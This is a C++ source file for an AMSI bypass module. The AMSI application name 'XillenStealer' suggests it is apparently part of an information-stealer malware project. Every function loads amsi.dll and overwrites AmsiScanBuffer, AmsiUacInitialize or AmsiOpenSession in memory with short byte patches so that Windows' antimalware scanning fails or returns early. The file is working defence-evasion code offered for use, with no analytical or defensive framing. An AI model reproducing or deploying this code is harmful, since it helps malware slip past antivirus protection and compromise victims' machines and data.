#include "amsi_bypass.h"
#include <Windows.h>
#include <amsi.h>

typedef HRESULT (WINAPI* pAmsiScanBuffer)(HAMSICONTEXT amsiContext, PVOID buffer, ULONG length, LPCWSTR contentName, HAMSISESSION amsiSession, AMSI_RESULT* result);

pAmsiScanBuffer originalAmsiScanBuffer = NULL;

bool AmsiBypass::PatchAmsiScanBuffer() {
    HMODULE hAmsi = LoadLibraryA("amsi.dll");
    if (!hAmsi) {
        return false;
    }
    
    pAmsiScanBuffer AmsiScanBuffer = (pAmsiScanBuffer)GetProcAddress(hAmsi, "AmsiScanBuffer");
    if (!AmsiScanBuffer) {
        return false;
    }
    
    DWORD oldProtect;
    if (!VirtualProtect((LPVOID)AmsiScanBuffer, 8, PAGE_EXECUTE_READWRITE, &oldProtect)) {
        return false;
    }
    
    BYTE patch[] = { 0x31, 0xC0, 0x05, 0x78, 0x56, 0x34, 0x12, 0xC3 };
    memcpy((LPVOID)AmsiScanBuffer, patch, sizeof(patch));
    
    VirtualProtect((LPVOID)AmsiScanBuffer, 8, oldProtect, &oldProtect);
    
    return true;
}

bool AmsiBypass::PatchAmsiUacInit() {
    HMODULE hAmsi = LoadLibraryA("amsi.dll");
    if (!hAmsi) {
        return false;
    }
    
    FARPROC pAmsiUacInit = GetProcAddress(hAmsi, "AmsiUacInitialize");
    if (!pAmsiUacInit) {
        return false;
    }
    
    DWORD oldProtect;
    if (!VirtualProtect(pAmsiUacInit, 5, PAGE_EXECUTE_READWRITE, &oldProtect)) {
        return false;
    }
    
    BYTE patch = 0xC3;
    memcpy(pAmsiUacInit, &patch, 1);
    
    VirtualProtect(pAmsiUacInit, 5, oldProtect, &oldProtect);
    
    return true;
}

bool AmsiBypass::PatchAmsi() {
    return PatchAmsiScanBuffer() || PatchAmsiUacInit();
}

bool AmsiBypass::DisableAmsi() {
    HMODULE hAmsi = LoadLibraryA("amsi.dll");
    if (!hAmsi) {
        return false;
    }
    
    FARPROC pAmsiOpenSession = GetProcAddress(hAmsi, "AmsiOpenSession");
    if (!pAmsiOpenSession) {
        return false;
    }
    
    DWORD oldProtect;
    if (!VirtualProtect(pAmsiOpenSession, 16, PAGE_EXECUTE_READWRITE, &oldProtect)) {
        return false;
    }
    
    BYTE patch[] = { 0x48, 0x31, 0xC0, 0xC3 };
    memcpy(pAmsiOpenSession, patch, sizeof(patch));
    
    VirtualProtect(pAmsiOpenSession, 16, oldProtect, &oldProtect);
    
    return true;
}

bool AmsiBypass::HookAmsiScanBuffer() {
    HMODULE hAmsi = LoadLibraryA("amsi.dll");
    if (!hAmsi) {
        return false;
    }
    
    originalAmsiScanBuffer = (pAmsiScanBuffer)GetProcAddress(hAmsi, "AmsiScanBuffer");
    if (!originalAmsiScanBuffer) {
        return false;
    }
    
    return PatchAmsiScanBuffer();
}

bool AmsiBypass::BypassAmsiHardware() {
    HAMSICONTEXT amsiContext = NULL;
    HAMSISESSION amsiSession = NULL;
    
    HRESULT hr = AmsiInitialize(L"XillenStealer", &amsiContext);
    if (FAILED(hr)) {
        return false;
    }
    
    hr = AmsiOpenSession(amsiContext, &amsiSession);
    if (FAILED(hr)) {
        AmsiUninitialize(amsiContext);
        return false;
    }
    
    BYTE testBuffer[] = { 0x41, 0x41, 0x41, 0x41 };
    AMSI_RESULT result = AMSI_RESULT_DETECTED;
    
    hr = AmsiScanBuffer(amsiContext, testBuffer, sizeof(testBuffer), L"test.exe", amsiSession, &result);
    
    AmsiCloseSession(amsiContext, amsiSession);
    AmsiUninitialize(amsiContext);
    
    return PatchAmsi();
}
